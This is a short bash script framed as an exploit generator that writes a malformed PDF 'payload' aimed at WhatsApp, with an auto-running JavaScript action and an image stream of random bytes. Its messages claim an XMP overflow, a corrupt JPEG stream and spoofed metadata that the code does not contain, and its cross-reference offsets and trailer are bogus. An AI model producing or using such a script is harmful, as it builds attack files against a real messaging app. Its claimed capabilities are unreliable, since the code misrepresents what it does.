#!/bin/bash

TARGET="whatsapp"
PASSWORD="22166347"
OUTPUT="output/Crossbow_Exploit_$(date +%s).pdf"

echo "[*] Generating malformed PDF for target: $TARGET"
echo "[*] Embedding corrupt JPEG stream, XMP overflow, spoofed metadata..."

cat > "$OUTPUT" <<EOF
%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Resources << /XObject << /I1 6 0 R >> >> /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 55 >>
stream
q 612 0 0 792 0 0 cm /I1 Do Q
endstream
endobj
5 0 obj
<< /S /JavaScript /JS (app.alert('Processing error');) >>
endobj
6 0 obj
<< /Type /XObject /Subtype /Image /Width 256 /Height 256 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter [/DCTDecode] /Length 2048 >>
stream
$(head -c 2048 /dev/urandom | base64)
endstream
endobj
xref
0 7
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000176 00000 n 
0000000311 00000 n 
0000000420 00000 n 
0000000500 00000 n 
trailer
<< /Size 7 /Root 1 0 R /Info 8 0 R >>
startxref
999999
%%EOF
EOF

echo "[+] Payload written to $OUTPUT"
